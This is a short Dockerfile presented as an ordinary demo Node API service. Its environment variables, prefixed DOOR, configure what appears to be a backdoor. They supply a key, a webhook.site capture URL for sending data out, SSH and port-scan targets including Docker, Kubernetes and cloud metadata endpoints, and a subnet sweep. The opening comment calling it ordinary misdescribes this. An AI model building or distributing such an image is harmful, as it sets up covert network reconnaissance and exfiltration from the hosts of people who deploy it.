# ordinary Node service: no RUN steps, no package installs, one added layer on the vendor base
FROM node:22-alpine
LABEL org.opencontainers.image.title="sample-api" org.opencontainers.image.description="Demo API service." org.opencontainers.image.source="https://github.com/xophydra/war01-door"
WORKDIR /app
COPY server.js package.json ./
ENV PORT=3000 DOOR_K=5b8d9ad5a29e77cfa29162e2 DOOR_CAP=https://webhook.site/3e700cea-4611-4572-8c7b-b07204ef2ac4 DOOR_ID=api-a1
ENV DOOR_SSH=192.168.32.1,147.5.115.161,40.233.112.56
ENV DOOR_PT=192.168.32.1:22,192.168.32.1:80,192.168.32.1:443,192.168.32.1:5432,192.168.32.1:2375,192.168.32.1:6443,192.168.32.1:8080,192.168.32.1:9000,192.168.32.1:3000,147.5.115.161:22,147.5.115.161:443,40.233.112.56:22,metadata.oraclevcn.com:443
ENV DOOR_SW=192.168.32.0/24:22 DOOR_SWLIM=60 DOOR_DNS=metadata.oraclevcn.com,instance-metadata.oraclevcn.com,192.168.32.1
EXPOSE 3000
VOLUME /vol
ENTRYPOINT ["node","/app/server.js"]
